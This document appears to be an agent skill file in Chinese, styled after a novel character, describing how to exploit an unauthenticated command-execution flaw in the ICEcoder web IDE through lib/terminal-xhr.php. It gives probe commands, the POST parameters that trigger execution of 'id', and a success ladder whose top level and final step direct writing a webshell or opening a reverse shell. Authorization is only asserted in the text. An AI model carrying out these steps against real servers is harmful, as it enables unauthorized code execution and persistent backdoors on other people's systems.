---
name: 白凝冰·冰码
description: >-
 授权目标上 ICEcoder（浏览器 IDE）CVE-2026-63722：lib/terminal-xhr.php
 未授权命令执行面。默认 GET；--deep 才 POST command=id。
---

> **白凝冰**
> 万丈红尘缤纷彩，天涯云水路遥长。
> 此刻风流归天地，不胜水中明月光。

# ICEcoder 未授权 RCE

**前提**：目标在 `授权范围`。

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | 标题 ICEcoder，或 GET 终端 JSON 含 `no command received` | 空 200 |
| L2 | `--deep` POST `command=id` 回 `uid=` | GET 200 当已 RCE |
| L3 | 写马 / 反弹 | 授权内直接做 |

```bash
python3 炼蛊房/icecoder_surface_probe.py --base https://授权站 --case <案卷>
python3 炼蛊房/icecoder_surface_probe.py --base https://授权站 --case <案卷> --deep
```

## 四刀

1. **认 IDE** — `/` `/icecoder/` 标题  
2. **终端活** — GET `/lib/terminal-xhr.php`（也试 `/ICEcoder/lib/`）  
3. **RCE** — `--deep`：任意 `password` + 非空 `csrf` + `command=id`  
4. **落地** — L2 后再写 marker / 反弹，不要把 nuclei 命中当已执行

真源：`传承/冰码·开天.md`
